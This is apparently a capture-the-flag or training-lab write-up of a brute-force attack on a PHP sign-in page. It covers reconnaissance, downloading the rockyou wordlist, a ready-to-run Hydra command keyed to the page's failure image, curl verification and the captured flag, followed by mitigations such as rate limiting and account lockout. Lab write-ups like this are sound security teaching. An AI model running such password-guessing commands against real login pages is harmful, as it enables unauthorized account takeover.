# Brute-Force Attack — Documentation

## How I Found It

**Initial reconnaissance:**
- Visited `http://192.168.1.16/index.php?page=signin`
- Tested login form with wrong credentials
- Observed consistent failure response: `images/WrongAnswer.gif`
- No CAPTCHA, no rate limiting, no account lockout detected
- Predictable error response makes automated attacks feasible

## How I Exploited It

**Preparation:**
```bash
# Download password wordlist
mkdir -p ~/wordlists && cd ~/wordlists
wget https://github.com/danielmiessler/SecLists/raw/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
tar -xvzf rockyou.txt.tar.gz
```

**Attack using Hydra:**
```bash
hydra -l admin -P ~/wordlists/rockyou.txt -F \
  192.168.1.16 \
  http-get-form "/index.php:page=signin&username=^USER^&password=^PASS^&Login=Login:F=images/WrongAnswer.gif"
```

**Parameters:**
- `-l admin` → username to test
- `-P ~/wordlists/rockyou.txt` → password list
- `-F` → stop on first success
- `F=images/WrongAnswer.gif` → failure marker

**Verification:**
```bash
curl -i "http://192.168.1.16/index.php?page=signin&username=admin&password=FOUND_PASSWORD&Login=Login"
```

**Flag obtained:**
```
b3a6e43ddf8b4bbb4125e5e7d23040433827759d4de1c04ea63907479a80a6b2
```

## Why It Works

**Vulnerabilities:**
1. **Predictable failure response** → Easy to detect success/failure
2. **No rate limiting** → Unlimited attempts from same IP
3. **No account lockout** → No temporary blocking after N failures
4. **Credentials in GET** → Exposed in URLs/logs
5. **No CAPTCHA** → No bot protection

## How to Fix It

**Immediate fixes:**

1. **Rate limiting (Nginx):**
```nginx
limit_req_zone $binary_remote_addr zone=login:10m rate=1r/s;
server {
  location = /index.php {
    if ($arg_page = "signin") {
      limit_req zone=login burst=5;
    }
  }
}
```

2. **Use POST for credentials** (not GET)

3. **Generic error messages** (don't reveal if username exists)

4. **Add CAPTCHA** after 3 failed attempts

5. **Temporary IP blocking** with Fail2Ban

**Long-term improvements:**

1. **Account lockout:**
```php
if ($user->failed_attempts >= 5) {
    if (time() < $user->locked_until) {
        die("Account locked. Try again in 15 minutes.");
    }
}
```

2. **Strong password policy** + breach database checks

3. **Multi-Factor Authentication (MFA)**

4. **Monitor for credential stuffing patterns**

5. **Use Argon2id/bcrypt for password hashing**

**Testing:**
```bash
# Should fail or be heavily rate-limited
hydra -l admin -P ~/wordlists/rockyou.txt 192.168.1.16 http-get-form "..."
```

## References

- OWASP Authentication Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html
- CWE-307: Improper Restriction of Excessive Authentication Attempts — https://cwe.mitre.org/data/definitions/307.html
- Hydra Tool — https://github.com/vanhauser-thc/thc-hydra
```